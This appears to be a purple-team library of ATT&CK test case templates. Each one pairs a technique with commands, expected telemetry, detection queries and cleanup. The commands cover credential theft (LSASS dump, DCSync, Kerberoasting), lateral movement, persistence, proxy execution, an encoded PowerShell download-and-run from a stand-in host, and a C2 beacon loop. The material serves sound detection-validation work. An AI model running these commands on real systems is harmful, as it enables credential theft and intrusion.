# Atomic Test Case Templates

Ready-to-use test cases for common purple team techniques.

---

## Discovery Techniques

### T1087.002 - Domain Account Discovery

```yaml
test_case:
  id: ATOMIC-T1087.002-001
  technique: T1087.002
  name: Domain Account Discovery - net.exe
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    commands:
      - net user /domain
      - net group "Domain Admins" /domain
      - net group "Enterprise Admins" /domain
      - net group "Domain Controllers" /domain
    
  expected_telemetry:
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\net.exe"
        CommandLine: "*group*domain*"
    - source: Windows Security
      event_id: 4688
      fields:
        NewProcessName: "*\\net.exe"
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=1 Image="*\\net.exe" 
      CommandLine IN ("*group*", "*user*") CommandLine="*/domain*"
    threshold: "3+ commands in 60 seconds suggests enumeration"
    
  cleanup:
    required: false
    
  references:
    - https://attack.mitre.org/techniques/T1087/002/
```

### T1069.002 - Domain Groups Discovery

```yaml
test_case:
  id: ATOMIC-T1069.002-001
  technique: T1069.002
  name: Domain Groups Discovery - Multiple Methods
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    commands:
      - net group /domain
      - net localgroup administrators
      - whoami /groups
      - gpresult /R
    
  expected_telemetry:
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\net.exe" OR "*\\whoami.exe" OR "*\\gpresult.exe"
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=1 
      (Image="*\\net.exe" CommandLine="*group*") OR 
      (Image="*\\whoami.exe" CommandLine="*/groups*") OR
      (Image="*\\gpresult.exe")
      | stats count by ComputerName, User
      | where count > 3
```

### T1018 - Remote System Discovery

```yaml
test_case:
  id: ATOMIC-T1018-001
  technique: T1018
  name: Remote System Discovery - Network Enumeration
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    commands:
      - net view /domain
      - nltest /dclist:%USERDOMAIN%
      - dsquery computer -limit 0
    
  expected_telemetry:
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\net.exe" OR "*\\nltest.exe" OR "*\\dsquery.exe"
        
  detection_opportunity:
    description: "Burst of network enumeration commands"
    query: |
      index=sysmon EventCode=1 
      Image IN ("*\\net.exe", "*\\nltest.exe", "*\\dsquery.exe")
      | bin _time span=2m
      | stats count values(Image) as tools by _time, ComputerName, User
      | where count > 4
```

---

## Credential Access Techniques

### T1003.001 - LSASS Memory Dump

```yaml
test_case:
  id: ATOMIC-T1003.001-001
  technique: T1003.001
  name: LSASS Memory Access - comsvcs.dll
  
  execution:
    platform: windows
    elevation_required: true
    executor: command_prompt
    warning: "Lab environment only"
    commands:
      - |
        for /f "tokens=2" %i in ('tasklist /fi "imagename eq lsass.exe" /nh') do (
          rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %i C:\temp\lsass.dmp full
        )
    
  expected_telemetry:
    - source: Sysmon
      event_id: 10
      fields:
        TargetImage: "*\\lsass.exe"
        GrantedAccess: "0x1fffff"
    - source: Sysmon
      event_id: 11
      fields:
        TargetFilename: "*.dmp"
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=10 TargetImage="*\\lsass.exe" 
      GrantedAccess IN ("0x1fffff", "0x1410", "0x143a", "0x1010")
      NOT SourceImage IN ("*\\csrss.exe", "*\\wininit.exe", "*\\MsMpEng.exe")
        
  cleanup:
    required: true
    commands:
      - del C:\temp\lsass.dmp
```

### T1003.006 - DCSync

```yaml
test_case:
  id: ATOMIC-T1003.006-001
  technique: T1003.006
  name: DCSync - Directory Replication
  
  execution:
    platform: windows
    elevation_required: true
    prerequisites:
      - "Replicating Directory Changes rights"
    executor: external_tool
    tool: mimikatz
    warning: "Extracts credentials - lab only"
    commands:
      - "lsadump::dcsync /domain:corp.local /user:krbtgt"
    
  expected_telemetry:
    - source: Windows Security (DC)
      event_id: 4662
      fields:
        Properties: "*Replicating Directory Changes*"
    - source: Network
      protocol: DCE-RPC
      operation: "DRSGetNCChanges"
      
  detection_opportunity:
    description: "Non-DC host requesting replication"
    query: |
      index=zeek sourcetype=zeek_dce_rpc 
      operation="DRSGetNCChanges"
      | lookup dc_list ip AS id.orig_h OUTPUT is_dc
      | where is_dc!="true"
    
  cleanup:
    required: false
```

### T1558.003 - Kerberoasting

```yaml
test_case:
  id: ATOMIC-T1558.003-001
  technique: T1558.003
  name: Kerberoasting - Service Ticket Request
  
  execution:
    platform: windows
    elevation_required: false
    executor: powershell
    commands:
      - |
        Add-Type -AssemblyName System.IdentityModel
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"
    
  expected_telemetry:
    - source: Windows Security (DC)
      event_id: 4769
      fields:
        ServiceName: "!krbtgt"
        TicketEncryptionType: "0x17"  # RC4
        
  detection_opportunity:
    description: "RC4 ticket requests for service accounts"
    query: |
      index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769 
      ServiceName!="krbtgt" TicketEncryptionType="0x17"
      | stats count by TargetUserName, ServiceName, IpAddress
      | where count > 5
    
  cleanup:
    required: false
```

---

## Execution Techniques

### T1059.001 - PowerShell

```yaml
test_case:
  id: ATOMIC-T1059.001-001
  technique: T1059.001
  name: PowerShell Encoded Command
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    commands:
      - powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdABlAHMAdAAuAGwAbwBjAGEAbAAnACkA
    
  expected_telemetry:
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\powershell.exe"
        CommandLine: "*-enc*" OR "*-encodedcommand*"
    - source: PowerShell
      event_id: 4104
      fields:
        ScriptBlockText: "*"  # Decoded content
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=1 Image="*\\powershell.exe"
      CommandLine IN ("*-enc*", "*-e *", "*-encodedcommand*")
    
  cleanup:
    required: false
```

### T1127.001 - MSBuild Proxy Execution

```yaml
test_case:
  id: ATOMIC-T1127.001-001
  technique: T1127.001
  name: MSBuild Inline Task Execution
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    setup:
      - Create malicious .csproj file
    commands:
      - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\temp\build.csproj
    
  csproj_template: |
    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
      <Target Name="TestTarget">
        <TestTask />
      </Target>
      <UsingTask TaskName="TestTask" TaskFactory="CodeTaskFactory" 
                 AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
        <Task>
          <Code Type="Class" Language="cs">
            <![CDATA[
            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            public class TestTask : Task {
              public override bool Execute() {
                Console.WriteLine("MSBuild Execution Test");
                return true;
              }
            }
            ]]>
          </Code>
        </Task>
      </UsingTask>
    </Project>
    
  expected_telemetry:
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\MSBuild.exe"
        CommandLine: "*.csproj*"
    - source: Sysmon
      event_id: 1
      parent_child:
        ParentImage: "*\\MSBuild.exe"
        Image: "*"  # Any child process is suspicious
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=1 
      ParentImage="*\\MSBuild.exe" 
      NOT Image IN ("*\\conhost.exe", "*\\MSBuild.exe")
    
  cleanup:
    required: true
    commands:
      - del C:\temp\build.csproj
```

---

## Lateral Movement Techniques

### T1021.002 - SMB/Windows Admin Shares

```yaml
test_case:
  id: ATOMIC-T1021.002-001
  technique: T1021.002
  name: ADMIN$ Share Access
  
  execution:
    platform: windows
    elevation_required: true
    executor: command_prompt
    commands:
      - net use \\TARGET\ADMIN$ /user:DOMAIN\admin Password123
      - copy malware.exe \\TARGET\ADMIN$\Temp\
      - net use \\TARGET\ADMIN$ /delete
    
  expected_telemetry:
    - source: Windows Security (target)
      event_id: 5140
      fields:
        ShareName: "*ADMIN$*"
    - source: Windows Security (target)
      event_id: 4624
      fields:
        LogonType: "3"  # Network
    - source: Sysmon (source)
      event_id: 3
      fields:
        DestinationPort: "445"
        
  detection_opportunity:
    query: |
      index=wineventlog sourcetype="WinEventLog:Security" EventCode=5140 
      ShareName IN ("*ADMIN$*", "*C$*", "*IPC$*")
      | stats count by IpAddress, AccountName, ShareName
    
  cleanup:
    required: true
    commands:
      - del \\TARGET\ADMIN$\Temp\malware.exe
      - net use \\TARGET\ADMIN$ /delete
```

### T1047 - WMI Lateral Movement

```yaml
test_case:
  id: ATOMIC-T1047-001
  technique: T1047
  name: WMI Process Creation
  
  execution:
    platform: windows
    elevation_required: true
    executor: command_prompt
    commands:
      - wmic /node:"TARGET" process call create "powershell -c whoami"
    
  expected_telemetry:
    - source: Sysmon (target)
      event_id: 1
      fields:
        ParentImage: "*\\WmiPrvSE.exe"
    - source: Windows Security (target)
      event_id: 4688
      fields:
        ParentProcessName: "*\\WmiPrvSE.exe"
        
  detection_opportunity:
    description: "WmiPrvSE spawning unexpected children"
    query: |
      index=sysmon EventCode=1 ParentImage="*\\WmiPrvSE.exe"
      NOT Image IN ("*\\WmiPrvSE.exe", "*\\scrcons.exe")
    
  cleanup:
    required: false
```

---

## Persistence Techniques

### T1053.005 - Scheduled Task

```yaml
test_case:
  id: ATOMIC-T1053.005-001
  technique: T1053.005
  name: Scheduled Task Persistence
  
  execution:
    platform: windows
    elevation_required: true
    executor: command_prompt
    commands:
      - schtasks /create /tn "PurpleTeamTest" /tr "powershell -c whoami" /sc hourly /ru SYSTEM
    
  expected_telemetry:
    - source: Windows Security
      event_id: 4698
      fields:
        TaskName: "*PurpleTeamTest*"
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\schtasks.exe"
        CommandLine: "*/create*"
        
  detection_opportunity:
    query: |
      index=wineventlog sourcetype="WinEventLog:Security" EventCode=4698
      | spath TaskContent
      | search TaskContent="*powershell*" OR TaskContent="*cmd*"
    
  cleanup:
    required: true
    commands:
      - schtasks /delete /tn "PurpleTeamTest" /f
```

### T1547.001 - Registry Run Keys

```yaml
test_case:
  id: ATOMIC-T1547.001-001
  technique: T1547.001
  name: Registry Run Key Persistence
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    commands:
      - reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PurpleTest /t REG_SZ /d "powershell -c whoami" /f
    
  expected_telemetry:
    - source: Sysmon
      event_id: 13
      fields:
        TargetObject: "*\\CurrentVersion\\Run\\*"
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\reg.exe"
        CommandLine: "*\\CurrentVersion\\Run*"
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=13 
      TargetObject IN ("*\\CurrentVersion\\Run\\*", "*\\CurrentVersion\\RunOnce\\*")
      Details IN ("*powershell*", "*cmd*", "*.exe*")
    
  cleanup:
    required: true
    commands:
      - reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PurpleTest /f
```

---

## Defense Evasion Techniques

### T1218.011 - Rundll32 Execution

```yaml
test_case:
  id: ATOMIC-T1218.011-001
  technique: T1218.011
  name: Rundll32 Proxy Execution
  
  execution:
    platform: windows
    elevation_required: false
    executor: command_prompt
    commands:
      - rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -c whoami")
    
  expected_telemetry:
    - source: Sysmon
      event_id: 1
      fields:
        Image: "*\\rundll32.exe"
        CommandLine: "*javascript*" OR "*mshtml*"
    - source: Sysmon
      event_id: 1
      parent_child:
        ParentImage: "*\\rundll32.exe"
        Image: "*\\powershell.exe"
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=1 Image="*\\rundll32.exe"
      CommandLine IN ("*javascript*", "*vbscript*", "*mshtml*", "*shell32*,ShellExec_RunDLL*")
    
  cleanup:
    required: false
```

### T1055.001 - DLL Injection

```yaml
test_case:
  id: ATOMIC-T1055.001-001
  technique: T1055.001
  name: CreateRemoteThread Injection
  
  execution:
    platform: windows
    elevation_required: true
    executor: external_tool
    warning: "Requires injection tooling - lab only"
    description: |
      Use tool like InjectDLL or custom injector to:
      1. OpenProcess on target
      2. VirtualAllocEx for DLL path
      3. WriteProcessMemory
      4. CreateRemoteThread with LoadLibraryA
    
  expected_telemetry:
    - source: Sysmon
      event_id: 8
      fields:
        TargetImage: "*"
    - source: Sysmon
      event_id: 10
      fields:
        GrantedAccess: "0x1fffff"
        
  detection_opportunity:
    query: |
      index=sysmon EventCode=8
      NOT (SourceImage="*\\csrss.exe" OR SourceImage="*\\services.exe")
      | table _time, SourceImage, TargetImage, StartAddress
    
  cleanup:
    required: false
    notes: "Injected DLL persists until target process terminates"
```

---

## Command and Control

### T1071.001 - HTTP C2

```yaml
test_case:
  id: ATOMIC-T1071.001-001
  technique: T1071.001
  name: HTTP Beacon Simulation
  
  execution:
    platform: windows
    elevation_required: false
    executor: powershell
    commands:
      - |
        while($true) {
          try { 
            $r = Invoke-WebRequest -Uri "http://c2.test.local/beacon" -UseBasicParsing
          } catch {}
          Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
        }
    
  expected_telemetry:
    - source: Sysmon
      event_id: 22
      fields:
        QueryName: "c2.test.local"
    - source: Sysmon
      event_id: 3
      fields:
        DestinationPort: "80"
    - source: Zeek
      log: http.log
      fields:
        user_agent: "*PowerShell*"
        
  detection_opportunity:
    description: "Periodic beaconing pattern"
    query: |
      index=zeek sourcetype=zeek_http host="c2.test.local"
      | timechart span=1m count
      | where count > 0
    jitter_analysis: |
      index=zeek sourcetype=zeek_http 
      | sort _time
      | streamstats current=f last(_time) as prev_time
      | eval delta=_time-prev_time
      | stats avg(delta) stdev(delta) by id.orig_h
    
  cleanup:
    required: true
    commands:
      - Stop-Process -Name powershell -Force
```

---

## Test Execution Tracking Template

```yaml
exercise:
  id: PT-2026-Q1-001
  name: "Q1 Detection Validation"
  date: "2026-01-28"
  methodology: atomic
  
  results:
    - test_id: ATOMIC-T1087.002-001
      outcome: alerted
      telemetry: logged
      prevention: not_blocked
      detection_time_seconds: 45
      detection_source: "Splunk Alert: Domain Enumeration"
      notes: "Alert fired but labeled INFO priority"
      
    - test_id: ATOMIC-T1003.001-001
      outcome: missed
      telemetry: logged
      prevention: not_blocked
      detection_time_seconds: null
      detection_source: null
      notes: "Sysmon Event 10 present but no alert rule exists"
      action_required: "Create LSASS access detection rule"
      
    - test_id: ATOMIC-T1021.002-001
      outcome: blocked
      telemetry: logged
      prevention: blocked
      detection_time_seconds: 0
      detection_source: "CrowdStrike Prevention"
      notes: "EDR blocked lateral movement attempt"
      
  summary:
    techniques_tested: 12
    logged: 12
    alerted: 8
    blocked: 3
    missed: 1
    detection_rate: "66.7%"
    prevention_rate: "25%"
```
